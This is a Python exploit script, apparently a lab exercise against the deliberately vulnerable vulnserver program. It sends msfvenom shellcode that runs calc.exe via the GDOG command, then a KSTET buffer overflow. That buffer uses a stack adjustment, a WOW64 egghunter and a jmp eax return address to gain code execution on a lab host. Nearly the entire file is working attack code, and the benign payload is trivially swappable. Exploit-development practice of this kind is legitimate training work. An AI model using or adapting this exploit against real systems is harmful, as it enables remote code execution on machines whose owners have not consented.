#!/usr/bin/python

import socket
import os
import sys
import struct


host = "172.16.10.127"
port = 9999

#root@kali:~/Projects/exploitdev/vulnserver# msfvenom -p windows/exec CMD=calc.exe -f python -b '\x00'
shellcode =  ""
shellcode += "\xb8\x62\x3a\x45\xdf\xdb\xcd\xd9\x74\x24\xf4\x5d\x2b"
shellcode += "\xc9\xb1\x31\x31\x45\x13\x03\x45\x13\x83\xed\x9e\xd8"
shellcode += "\xb0\x23\xb6\x9f\x3b\xdc\x46\xc0\xb2\x39\x77\xc0\xa1"
shellcode += "\x4a\x27\xf0\xa2\x1f\xcb\x7b\xe6\x8b\x58\x09\x2f\xbb"
shellcode += "\xe9\xa4\x09\xf2\xea\x95\x6a\x95\x68\xe4\xbe\x75\x51"
shellcode += "\x27\xb3\x74\x96\x5a\x3e\x24\x4f\x10\xed\xd9\xe4\x6c"
shellcode += "\x2e\x51\xb6\x61\x36\x86\x0e\x83\x17\x19\x05\xda\xb7"
shellcode += "\x9b\xca\x56\xfe\x83\x0f\x52\x48\x3f\xfb\x28\x4b\xe9"
shellcode += "\x32\xd0\xe0\xd4\xfb\x23\xf8\x11\x3b\xdc\x8f\x6b\x38"
shellcode += "\x61\x88\xaf\x43\xbd\x1d\x34\xe3\x36\x85\x90\x12\x9a"
shellcode += "\x50\x52\x18\x57\x16\x3c\x3c\x66\xfb\x36\x38\xe3\xfa"
shellcode += "\x98\xc9\xb7\xd8\x3c\x92\x6c\x40\x64\x7e\xc2\x7d\x76"
shellcode += "\x21\xbb\xdb\xfc\xcf\xa8\x51\x5f\x85\x2f\xe7\xe5\xeb"
shellcode += "\x30\xf7\xe5\x5b\x59\xc6\x6e\x34\x1e\xd7\xa4\x71\xd0"
shellcode += "\x9d\xe5\xd3\x79\x78\x7c\x66\xe4\x7b\xaa\xa4\x11\xf8"
shellcode += "\x5f\x54\xe6\xe0\x15\x51\xa2\xa6\xc6\x2b\xbb\x42\xe9"
shellcode += "\x98\xbc\x46\x8a\x7f\x2f\x0a\x63\x1a\xd7\xa9\x7b"

print "Shellcode lenght is: ", len(shellcode)

prep_size = 1000
EGG = "\x77\x30\x30\x74"

prep  = "GDOG "
prep += EGG + EGG
prep += shellcode

# WOW64 Egghunter written by Lincoln
# lincoln@corelan.be
# 64 stub needed before loop
hunter = "\x33\xd2"                             #xor edx,edx
hunter += "\x52"                                #push edx
hunter += "\x52"                                #push edx
hunter += "\x52"                                #push edx
hunter += "\x52"                                #push edx
hunter += "\x80\xc3\xc0"            #add bl,0xc0   #Changed by n3k
# 64 Loop
hunter += "\x66\x81\xCA\xFF\x0F"                #OR DX,0FFF
hunter += "\x42"                                #INC EDX
hunter += "\x52"                                #PUSH EDX
hunter += "\x6A\x26"                #PUSH 26
hunter += "\x58"                                #POP EAX
hunter += "\x33\xC9"                #XOR ECX,ECX
hunter += "\x8B\xD4"                #MOV EDX,ESP
hunter += "\x64\xff\x13"                #CALL DWORD PTR FS:[ebx]
hunter += "\x5e"                                #POP ESI
hunter += "\x5a"                                #POP EDX
hunter += "\x3C\x05"                #CMP AL,5
hunter += "\x74\xe9"                #JE SHORT egg.0043F000
hunter += "\xB8"+EGG                    #MOV EAX,74303077 w00t
hunter += "\x8B\xFA"                            #MOV EDI,EDX
hunter += "\xAF"                                #SCAS DWORD PTR ES:[EDI]
hunter += "\x75\xe4"                            #JNZ SHORT egg.0043F001
hunter += "\xAF"                                #SCAS DWORD PTR ES:[EDI]
hunter += "\x75\xe1"                            #JNZ SHORT 0043F001
hunter += "\xFF\xE7"                            #JMP EDI

print "Egghunter lenght is ", len(hunter)

#EIP contains normal pattern : 0x41326341 (offset 66)
#ESP (0x038df9e0) points at offset 70 in normal pattern (length 20)
#EBP contains normal pattern : 0x31634130 (offset 62)

# I will overwrite EIP with only 3 chars so I can use NULL char in pointer because it will replaced by the string terminating char

#0x0040100c : jmp eax | startnull,ascii {PAGE_EXECUTE_READ} [vulnserver.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (c:\Users\kartone\Desktop\vulnserver-master\vulnserver.exe)

size = 76
eip_offset = 70

padding = "AA"
stack_adj = "\x81\xC4\x24\xFA\xFF\xFF" # ADD ESP, -1500

# Due to a limited space I need to prevent that the 'KSTET' interpreted code (few pushes) eats my egghunter code.
# This is done by moving ESP away.
# Padding is required to not let the last interpreted opcode to raise exception and crash the program.

buffer  = "KSTET "
buffer += padding
buffer += stack_adj
buffer += hunter
buffer += "A" * (size - len(buffer))
buffer += struct.pack('<L', 0x40100c)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connecting to the server..."
s.connect((host,port))
print s.recv(1024)
print "Sending preparation stuff..."
s.send(prep)
print s.recv(1024)
print "[+] Sending evil buffer..."
s.send(buffer)
print s.recv(1024)
s.close()
